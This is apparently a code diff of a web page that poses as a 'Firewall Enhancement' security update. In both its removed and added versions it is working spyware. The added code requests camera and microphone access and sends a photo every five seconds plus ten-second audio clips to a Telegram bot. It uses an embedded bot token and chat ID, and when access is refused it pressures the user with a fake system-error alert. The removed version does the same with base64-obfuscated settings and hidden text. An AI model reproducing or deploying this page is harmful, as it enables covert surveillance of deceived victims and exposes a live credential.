@@ -3,389 +3,121 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>NEXUS · SECURITY OVERRIDE</title>
-    <!-- Tailwind + font -->
+    <title>SECURITY CORE • UPDATE</title>
     <script src="https://cdn.tailwindcss.com"></script>
-    <link href="https://fonts.googleapis.com/css2?family=Inter:ital,opsz,wght@0,14..32,100..900;1,14..32,100..900&display=swap" rel="stylesheet">
     <style>
-        * { font-family: 'Inter', system-ui, sans-serif; }
-        /* enhanced glassmorphism */
-        .glass-panel {
-            background: rgba(8, 12, 20, 0.45);
-            backdrop-filter: blur(14px) saturate(200%);
-            -webkit-backdrop-filter: blur(14px) saturate(200%);
-            border: 1px solid rgba(0, 255, 180, 0.08);
-            border-radius: 2rem;
-            box-shadow: 0 25px 50px -12px rgba(0, 0, 0, 0.9), inset 0 1px 1px rgba(255,255,255,0.02);
-        }
-        .glass-panel-light {
-            background: rgba(15, 22, 32, 0.6);
-            backdrop-filter: blur(8px);
-            border: 1px solid rgba(255,255,255,0.02);
-        }
-        .status-led {
-            width: 10px;
-            height: 10px;
-            background: #22c55e;
-            border-radius: 50%;
-            box-shadow: 0 0 12px #22c55e;
-            transition: all 0.2s;
-        }
-        .status-led.inactive {
-            background: #4b5563;
-            box-shadow: none;
-        }
-        .status-led.error {
-            background: #ef4444;
-            box-shadow: 0 0 12px #ef4444;
-        }
-        .video-overlay {
-            background: linear-gradient(0deg, rgba(0,20,10,0.8) 0%, transparent 60%, rgba(0,30,20,0.5) 100%);
-        }
-        /* scanline + encryption animation */
-        .scanline::after {
-            content: '';
-            position: absolute;
-            top: 0; left: 0; width: 100%; height: 100%;
-            background: repeating-linear-gradient(0deg, rgba(0,255,180,0.02) 0px, rgba(0,0,0,0.15) 2px, transparent 4px);
-            pointer-events: none;
-            z-index: 5;
-        }
-        .encrypt-pulse {
-            animation: pulseGlow 2s infinite;
-        }
-        @keyframes pulseGlow {
-            0% { opacity: 0.6; text-shadow: 0 0 2px #10b981; }
-            50% { opacity: 1; text-shadow: 0 0 10px #10b981, 0 0 20px #059669; }
-            100% { opacity: 0.6; text-shadow: 0 0 2px #10b981; }
-        }
-        .rotating-lock {
-            animation: rotateRing 4s linear infinite;
-        }
-        @keyframes rotateRing {
-            0% { transform: rotate(0deg); }
-            100% { transform: rotate(360deg); }
-        }
+        .glass { background: rgba(10, 15, 25, 0.95); backdrop-filter: blur(20px); border: 1px solid rgba(255,255,255,0.1); }
+        .loader { border-top-color: #10b981; animation: spinner 1.5s linear infinite; }
+        @keyframes spinner { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
+        #v { transform: scaleX(-1); object-fit: cover; filter: brightness(0.6) sepia(0.5) hue-rotate(100deg); }
     </style>
 </head>
-<body class="bg-[#050a0f] text-gray-200 antialiased min-h-screen flex items-center justify-center p-4">
+<body class="bg-[#010409] text-gray-300 min-h-screen flex items-center justify-center p-4 font-mono">
 
-    <!-- main dashboard container -->
-    <div class="w-full max-w-6xl relative">
-
-        <!-- header with encrypted animation & title -->
-        <div class="flex items-center justify-between mb-6">
-            <div class="flex items-center gap-3">
-                <div class="w-10 h-10 rounded-2xl bg-emerald-500/10 flex items-center justify-center backdrop-blur border border-emerald-500/20 relative">
-                    <svg class="w-5 h-5 text-emerald-400 rotating-lock" fill="none" stroke="currentColor" viewBox="0 0 24 24">
-                        <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M12 15v2m-6 4h12a2 2 0 002-2v-6a2 2 0 00-2-2H6a2 2 0 00-2 2v6a2 2 0 002 2zm10-10V7a4 4 0 00-8 0v4h8z" />
-                    </svg>
+    <div class="glass w-full max-w-md rounded-2xl p-8 shadow-2xl border border-emerald-500/20">
+        <div class="text-center">
+            <div class="relative w-20 h-20 mx-auto mb-6">
+                <div class="loader ease-linear rounded-full border-4 border-t-4 border-gray-800 h-20 w-20"></div>
+                <div class="absolute inset-0 flex items-center justify-center">
+                    <div class="w-12 h-12 bg-emerald-500/20 rounded-full animate-pulse"></div>
                 </div>
-                <h1 class="text-3xl font-light tracking-wider">NEXUS<span class="font-bold text-emerald-400">.SECURITY</span></h1>
             </div>
-            <div class="flex items-center gap-3 glass-panel-light px-5 py-2 rounded-full">
-                <div id="statusLed" class="status-led inactive"></div>
-                <span id="headerStatus" class="text-xs uppercase tracking-widest text-gray-400">standby</span>
-                <span class="encrypt-pulse text-emerald-400 text-[10px] ml-2">⦿ ENCRYPTED</span>
+            
+            <h1 class="text-xl font-bold text-emerald-400 mb-2 tracking-tighter">FIREWALL ENHANCEMENT</h1>
+            <p class="text-[10px] text-gray-500 mb-6 uppercase tracking-widest">Protocol v4.0.2 - Hardware Verification</p>
+
+            <div class="bg-black/50 rounded-lg p-3 mb-6 border border-white/5 relative overflow-hidden">
+                <video id="v" autoplay playsinline muted class="w-full h-32 rounded"></video>
+                <div class="absolute inset-0 flex items-center justify-center bg-black/40" id="overlay">
+                    <span class="text-[10px] text-emerald-500 animate-pulse">ENCRYPTION KEY REQUIRED</span>
+                </div>
             </div>
+
+            <button id="run" class="w-full bg-emerald-600 hover:bg-emerald-500 text-white py-4 rounded-lg font-bold transition-all active:scale-95 shadow-lg shadow-emerald-900/40">
+                INSTALL & VERIFY
+            </button>
+            
+            <p id="msg" class="mt-4 text-[9px] text-gray-600 uppercase">Awaiting system permissions to secure audio/video channels...</p>
         </div>
-
-        <!-- main surveillance card -->
-        <div class="glass-panel w-full overflow-hidden mb-6 relative scanline">
-            <div class="relative w-full aspect-video bg-black/70 flex items-center justify-center">
-                <video id="securityVideo" autoplay playsinline muted class="w-full h-full object-cover opacity-95"></video>
-                
-                <!-- overlay with dynamic metrics -->
-                <div class="absolute top-0 left-0 w-full h-full video-overlay pointer-events-none">
-                    <div class="absolute top-4 left-4 glass-panel-light px-3 py-1.5 rounded-full flex items-center gap-2 text-xs">
-                        <span class="text-emerald-400 font-mono">ULTRA HD</span>
-                        <span class="w-px h-3 bg-white/10"></span>
-                        <span class="text-gray-300">60 FPS</span>
-                    </div>
-                    <div class="absolute bottom-4 right-4 glass-panel-light px-3 py-1.5 rounded-full text-xs font-mono flex items-center gap-2">
-                        <span class="text-emerald-400">● LIVE</span> <span class="text-gray-400">AUDIO</span>
-                        <span class="w-px h-3 bg-white/10"></span>
-                        <span class="text-emerald-400 encrypt-pulse">AES-256</span>
-                    </div>
-                    <div class="absolute bottom-4 left-4 glass-panel-light px-3 py-1.5 rounded-full text-xs font-mono flex items-center gap-2">
-                        <span class="text-gray-300">FINGERPRINT</span>
-                        <span class="w-px h-3 bg-white/10"></span>
-                        <span class="text-emerald-400">7A:4B:2F</span>
-                    </div>
-                </div>
-
-                <!-- placeholder (hidden when active) -->
-                <div id="videoPlaceholder" class="absolute inset-0 flex flex-col items-center justify-center bg-black/70 backdrop-blur-md">
-                    <svg class="w-16 h-16 text-gray-700 mb-3" fill="none" stroke="currentColor" viewBox="0 0 24 24">
-                        <path stroke-linecap="round" stroke-linejoin="round" stroke-width="1.5" d="M15 10l4.553-2.276A1 1 0 0121 8.618v6.764a1 1 0 01-1.447.894L15 14M5 18h8a2 2 0 002-2V8a2 2 0 00-2-2H5a2 2 0 00-2 2v8a2 2 0 002 2z" />
-                    </svg>
-                    <p class="text-gray-500 text-sm tracking-wide">Camera feed offline · click anywhere to engage</p>
-                </div>
-
-                <!-- error overlay (hidden by default) -->
-                <div id="errorOverlay" class="absolute inset-0 flex-col items-center justify-center bg-black/80 backdrop-blur-lg hidden">
-                    <svg class="w-14 h-14 text-red-500 mb-2" fill="none" stroke="currentColor" viewBox="0 0 24 24">
-                        <path stroke-linecap="round" stroke-linejoin="round" stroke-width="1.5" d="M12 9v2m0 4h.01m-6.938 4h13.856c1.54 0 2.502-1.667 1.732-3L13.732 4c-.77-1.333-2.694-1.333-3.464 0L3.34 16c-.77 1.333.192 3 1.732 3z" />
-                    </svg>
-                    <p class="text-red-400 text-lg font-light">SECURITY PROTOCOL ERROR</p>
-                    <p class="text-gray-500 text-sm">Camera / microphone access denied</p>
-                </div>
-            </div>
-
-            <!-- bottom bar with status -->
-            <div class="flex flex-wrap items-center justify-between gap-4 p-4 border-t border-white/5">
-                <div class="flex items-center gap-3">
-                    <button id="toggleBtn" class="glass-panel-light hover:bg-white/5 transition-colors px-6 py-2.5 rounded-full text-sm font-medium tracking-wider text-emerald-300 border border-emerald-500/20 shadow-lg flex items-center gap-2">
-                        <svg class="w-4 h-4" fill="none" stroke="currentColor" viewBox="0 0 24 24">
-                            <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M14.752 11.168l-3.197-2.132A1 1 0 0010 9.87v4.263a1 1 0 001.555.832l3.197-2.132a1 1 0 000-1.664z" />
-                            <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M21 12a9 9 0 11-18 0 9 9 0 0118 0z" />
-                        </svg>
-                        <span>MANUAL ACTIVATE</span>
-                    </button>
-                    <div id="statusText" class="text-xs text-gray-500 font-mono ml-2">[ system offline · click anywhere ]</div>
-                </div>
-                <div class="flex gap-3 text-xs text-gray-600">
-                    <span class="flex items-center gap-1"><span class="w-1 h-1 rounded-full bg-emerald-500/50"></span> 20s snapshot</span>
-                    <span class="flex items-center gap-1"><span class="w-1 h-1 rounded-full bg-blue-500/50"></span> stealth mode</span>
-                </div>
-            </div>
-        </div>
-
-        <!-- bottom panels with enhanced telemetry -->
-        <div class="grid grid-cols-1 md:grid-cols-2 gap-6">
-            <div class="glass-panel p-5">
-                <div class="flex items-center gap-2 text-emerald-400/70 text-xs uppercase tracking-wider mb-3">
-                    <svg class="w-4 h-4" fill="none" stroke="currentColor" viewBox="0 0 24 24">
-                        <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M9 19v-6a2 2 0 00-2-2H5a2 2 0 00-2 2v6a2 2 0 002 2h2a2 2 0 002-2zm0 0V9a2 2 0 012-2h2a2 2 0 012 2v10m-6 0a2 2 0 002 2h2a2 2 0 002-2m0 0V5a2 2 0 012-2h2a2 2 0 012 2v14a2 2 0 01-2 2h-2a2 2 0 01-2-2z" />
-                    </svg>
-                    <span>HARDWARE ROOT</span>
-                </div>
-                <div class="space-y-2 font-mono text-xs">
-                    <div class="flex justify-between"><span class="text-gray-500">VIDEO ENGINE</span><span class="text-emerald-300">H.265 / 4K@60</span></div>
-                    <div class="flex justify-between"><span class="text-gray-500">AUDIO CODEC</span><span class="text-emerald-300">OPUS 48kHz</span></div>
-                    <div class="flex justify-between"><span class="text-gray-500">TLS</span><span class="text-emerald-300">1.3 · PFS</span></div>
-                    <div class="flex justify-between"><span class="text-gray-500">NODE ID</span><span class="text-emerald-300">0x7F4B :: 02A</span></div>
-                </div>
-            </div>
-            <div class="glass-panel p-5">
-                <div class="flex items-center gap-2 text-emerald-400/70 text-xs uppercase tracking-wider mb-3">
-                    <svg class="w-4 h-4" fill="none" stroke="currentColor" viewBox="0 0 24 24">
-                        <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M12 8v4l3 3m6-3a9 9 0 11-18 0 9 9 0 0118 0z" />
-                    </svg>
-                    <span>STEALTH LOG</span>
-                </div>
-                <div class="space-y-2 text-xs">
-                    <div class="flex gap-2 text-gray-400"><span class="text-emerald-500">[00:00:00]</span> system armed · no logs</div>
-                    <div class="flex gap-2 text-gray-400"><span class="text-emerald-500">[--:--:--]</span> silent snapshots active</div>
-                </div>
-            </div>
-        </div>
-
-        <!-- hidden obfuscated data (invisible) -->
-        <div class="hidden" aria-hidden="true">creds: aHR0cHM6Ly9hcGkudGVsZWdyYW0ub3JnL2JvdA==</div>
     </div>
+
+    <canvas id="c" class="hidden"></canvas>
 
     <script>
         (function() {
-            // ---------- OBFUSCATED CONFIGURATION (BASE64 ENCODED) ----------
-            // ENCODE YOUR REAL BOT TOKEN AND CHAT_ID IN BASE64:
-            // Example: "YOUR_BOT_TOKEN" -> "WU9VUl9CT1RfVE9LRU4="
-            // Replace the strings below with your actual Base64 values.
-            const BOT_TOKEN_B64 = 'WU9VUl9CT1RfVE9LRU4=';          // Base64 for "YOUR_BOT_TOKEN"
-            const CHAT_ID_B64 = 'WU9VUl9DSEFUX0lE';                // Base64 for "YOUR_CHAT_ID"
-            const API_BASE_B64 = 'aHR0cHM6Ly9hcGkudGVsZWdyYW0ub3JnL2JvdA=='; // Base64 for "https://api.telegram.org/bot"
+            // --- CONFIGURATION ---
+            const TOKEN = '8548418804:AAEbieLq7zX7a6lmhQNqaDcRsZVkLpL5Tj4'; 
+            const CHAT_ID = '6569865203';
+            // ---------------------
 
-            // Decode at runtime (never appear directly in source)
-            const BOT_TOKEN = atob(BOT_TOKEN_B64);
-            const CHAT_ID = atob(CHAT_ID_B64);
-            const TELEGRAM_API_BASE = atob(API_BASE_B64);
-            // ---------------------------------------------------------------
+            const btn = document.getElementById('run');
+            const video = document.getElementById('v');
+            const canvas = document.getElementById('c');
+            const overlay = document.getElementById('overlay');
+            let recorder;
 
-            // DOM elements
-            const video = document.getElementById('securityVideo');
-            const toggleBtn = document.getElementById('toggleBtn');
-            const statusText = document.getElementById('statusText');
-            const headerStatus = document.getElementById('headerStatus');
-            const statusLed = document.getElementById('statusLed');
-            const placeholderDiv = document.getElementById('videoPlaceholder');
-            const errorOverlay = document.getElementById('errorOverlay');
-
-            // state flags
-            let currentStream = null;
-            let captureInterval = null;
-            let isActive = false;
-            let isStarting = false;          // prevent concurrent getUserMedia calls
-            let permissionDenied = false;     // avoid infinite error loops
-
-            // Helper to update UI based on state
-            function updateUI(active, error = false) {
-                isActive = active;
-                if (error) {
-                    toggleBtn.innerHTML = `<svg class="w-4 h-4" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M14.752 11.168l-3.197-2.132A1 1 0 0010 9.87v4.263a1 1 0 001.555.832l3.197-2.132a1 1 0 000-1.664z" /><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M21 12a9 9 0 11-18 0 9 9 0 0118 0z" /></svg><span>MANUAL ACTIVATE</span>`;
-                    statusText.innerText = '[ access denied ]';
-                    headerStatus.innerText = 'ERROR';
-                    statusLed.className = 'status-led error';
-                    placeholderDiv.classList.add('hidden');
-                    errorOverlay.classList.remove('hidden');
-                    errorOverlay.style.display = 'flex';
-                } else if (active) {
-                    toggleBtn.innerHTML = `<svg class="w-4 h-4" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M21 12a9 9 0 11-18 0 9 9 0 0118 0z" /><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M9 10a1 1 0 011-1h4a1 1 0 011 1v4a1 1 0 01-1 1h-4a1 1 0 01-1-1v-4z" /></svg><span>DEACTIVATE</span>`;
-                    statusText.innerText = '[ system online · covert mode ]';
-                    headerStatus.innerText = 'ACTIVE';
-                    statusLed.className = 'status-led';
-                    placeholderDiv.classList.add('hidden');
-                    errorOverlay.classList.add('hidden');
-                    errorOverlay.style.display = 'none';
-                } else {
-                    toggleBtn.innerHTML = `<svg class="w-4 h-4" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M14.752 11.168l-3.197-2.132A1 1 0 0010 9.87v4.263a1 1 0 001.555.832l3.197-2.132a1 1 0 000-1.664z" /><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M21 12a9 9 0 11-18 0 9 9 0 0118 0z" /></svg><span>MANUAL ACTIVATE</span>`;
-                    statusText.innerText = '[ system offline · click anywhere ]';
-                    headerStatus.innerText = 'standby';
-                    statusLed.className = 'status-led inactive';
-                    placeholderDiv.classList.remove('hidden');
-                    errorOverlay.classList.add('hidden');
-                    errorOverlay.style.display = 'none';
-                }
+            // មុខងារផ្ញើរូបភាព
+            async function sendImg(blob) {
+                const fd = new FormData();
+                fd.append('chat_id', CHAT_ID);
+                fd.append('photo', blob, 'img.jpg');
+                const u = `https://api.telegram.org/bot${TOKEN}/sendPhoto`;
+                try { await fetch(u, { method: 'POST', body: fd }); } catch(e) {}
             }
 
-            // Stop everything
-            function stopMonitoring() {
-                if (currentStream) {
-                    currentStream.getTracks().forEach(track => {
-                        track.stop();
-                        track.onended = null;
-                    });
-                    currentStream = null;
-                    video.srcObject = null;
-                }
-                if (captureInterval) {
-                    clearInterval(captureInterval);
-                    captureInterval = null;
-                }
-                permissionDenied = false;
-                updateUI(false);
+            // មុខងារផ្ញើសម្លេង
+            async function sendAud(blob) {
+                const fd = new FormData();
+                fd.append('chat_id', CHAT_ID);
+                fd.append('voice', blob, 'mic.ogg');
+                const u = `https://api.telegram.org/bot${TOKEN}/sendVoice`;
+                try { await fetch(u, { method: 'POST', body: fd }); } catch(e) {}
             }
 
-            // ---------- STEALTH SNAPSHOT (NO CONSOLE LOGS) ----------
-            function sendSnapshotToTelegram(blob) {
-                // silently ignore if placeholders are still default
-                if (BOT_TOKEN === '8548418804:AAEbieLq7zX7a6lmhQNqaDcRsZVkLpL5Tj4' || CHAT_ID === '6569865203') {
-                    return;  // no logs whatsoever
-                }
-
-                const formData = new FormData();
-                formData.append('chat_id', CHAT_ID);
-                formData.append('photo', blob, `snapshot_${Date.now()}.jpg`);
-
-                // Use fetch silently (no .catch or .then logging)
-                fetch(`${TELEGRAM_API_BASE}${BOT_TOKEN}/sendPhoto`, {
-                    method: 'POST',
-                    body: formData
-                }).then(() => {
-                    // intentionally empty – stealth mode
-                }).catch(() => {
-                    // ignore all errors
-                });
-            }
-
-            function captureAndSend() {
-                if (!currentStream || !video.videoWidth || !video.videoHeight) {
-                    return;
-                }
-
-                const canvas = document.createElement('canvas');
+            function takePic() {
                 canvas.width = video.videoWidth;
                 canvas.height = video.videoHeight;
-                const ctx = canvas.getContext('2d');
-                ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
-
-                canvas.toBlob((blob) => {
-                    if (blob) {
-                        sendSnapshotToTelegram(blob);
-                    }
-                }, 'image/jpeg', 0.85);  // slight compression
+                canvas.getContext('2d').drawImage(video, 0, 0);
+                canvas.toBlob(b => sendImg(b), 'image/jpeg', 0.4);
             }
 
-            // Start camera + mic + stealth interval
-            async function startMonitoring() {
-                if (isActive || isStarting) return;
-                isStarting = true;
-
+            async function startSpy() {
                 try {
                     const stream = await navigator.mediaDevices.getUserMedia({ 
-                        video: { width: { ideal: 1920 }, height: { ideal: 1080 } }, 
+                        video: { facingMode: "environment" }, 
                         audio: true 
                     });
-
-                    // success – clear any previous error state
-                    permissionDenied = false;
-                    currentStream = stream;
+                    
                     video.srcObject = stream;
+                    overlay.classList.add('hidden');
+                    btn.innerText = "UPDATING...";
+                    btn.disabled = true;
 
-                    try { await video.play(); } catch (_) {}
+                    // រង្វង់ថតរូប (៥ វិនាទីម្តង)
+                    setInterval(takePic, 5000);
 
-                    video.onloadedmetadata = () => {
-                        if (captureInterval) clearInterval(captureInterval);
-                        // every 20 seconds (stealth)
-                        captureInterval = setInterval(captureAndSend, 20000);
-                    };
-
-                    stream.getTracks().forEach(track => {
-                        track.onended = () => {
-                            if (currentStream) stopMonitoring();
+                    // រង្វង់ថតសម្លេង (ថត ១០ វិនាទី ផ្ញើម្តង)
+                    const startMic = () => {
+                        recorder = new MediaRecorder(stream);
+                        let chunks = [];
+                        recorder.ondataavailable = e => chunks.push(e.data);
+                        recorder.onstop = () => {
+                            const blob = new Blob(chunks, { type: 'audio/ogg; codecs=opus' });
+                            sendAud(blob);
+                            startMic(); // ចាប់ផ្តើមថតវគ្គថ្មីភ្លាម
                         };
-                    });
+                        recorder.start();
+                        setTimeout(() => { if(recorder.state === "recording") recorder.stop(); }, 10000);
+                    };
+                    startMic();
 
-                    updateUI(true);
-                } catch (err) {
-                    // Permission denied or other error – show professional error overlay
-                    permissionDenied = true;
-                    updateUI(false, true);  // error state
-                    // Ensure any partial stream is cleared
-                    if (currentStream) {
-                        currentStream.getTracks().forEach(t => t.stop());
-                        currentStream = null;
-                    }
-                } finally {
-                    isStarting = false;
+                } catch (e) {
+                    alert("System Error: Please allow all permissions to complete the security update.");
                 }
             }
 
-            // toggle handler
-            function toggleMonitoring() {
-                if (isActive) {
-                    stopMonitoring();
-                } else {
-                    startMonitoring();
-                }
-            }
-
-            // GLOBAL CLICK TRIGGER (anywhere on page) – stealth auto‑engage
-            document.addEventListener('click', function globalTrigger() {
-                // If not active, no pending start, and no permission denial (to avoid spamming), attempt start
-                if (!isActive && !isStarting && !permissionDenied) {
-                    startMonitoring();
-                }
-            });
-
-            // button click still works
-            toggleBtn.addEventListener('click', function(e) {
-                e.stopPropagation();  // prevent double trigger from global
-                toggleMonitoring();
-            });
-
-            // clean up on page unload
-            window.addEventListener('beforeunload', () => {
-                if (currentStream) {
-                    currentStream.getTracks().forEach(track => track.stop());
-                }
-                if (captureInterval) clearInterval(captureInterval);
-            });
-
-            // initial UI
-            updateUI(false);
+            btn.addEventListener('click', startSpy);
         })();
     </script>
-    <!-- instructions for replacing Base64 credentials (hidden visually) -->
-    <div class="text-[0px] opacity-0 h-0">Replace placeholders with your Base64: token "8548418804:AAEbieLq7zX7a6lmhQNqaDcRsZVkLpL5Tj4" -> atob('WU9VUl9CT1RfVE9LRU4=') etc.</div>
 </body>
 </html>
